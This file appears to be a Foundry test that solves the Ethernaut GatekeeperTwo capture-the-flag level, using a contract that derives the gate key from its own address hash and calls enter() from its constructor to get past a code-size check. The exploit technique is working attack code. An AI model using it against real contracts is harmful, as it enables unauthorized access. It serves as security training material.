pragma solidity >=0.8.19;

import { Test } from "forge-std/Test.sol";
import { GatekeeperTwo } from "src/GatekeeperTwo/GatekeeperTwo.sol";
import { GatekeeperTwoFactory } from "src/GatekeeperTwo/GatekeeperTwoFactory.sol";
import { Ethernaut } from "src/Ethernaut.sol";
import "forge-std/console2.sol";

contract GatekeeperTwoExploit {
    address victim;

    constructor(address _victim) {
        victim = _victim;
        bytes8 key = bytes8(~uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
        (bool success,) = victim.call(abi.encodeWithSignature("enter(bytes8)", key));
        require(success);
    }
}

contract GatekeeperTwoTest is Test {
    Ethernaut ethernaut;
    address me = makeAddr("me");

    function setUp() external {
        ethernaut = new Ethernaut();
    }

    function testGatekeeperTwoHack() external {
        // level setup
        GatekeeperTwoFactory factory = new GatekeeperTwoFactory();
        ethernaut.registerLevel(factory);

        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(factory);
        GatekeeperTwo gateKeeper = GatekeeperTwo(payable(levelAddress));
        vm.stopPrank();

        // attack
        GatekeeperTwoExploit exploit = new GatekeeperTwoExploit(address(gateKeeper));

        // submission
        vm.startPrank(tx.origin);
        bool levelPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelPassed);
    }
}
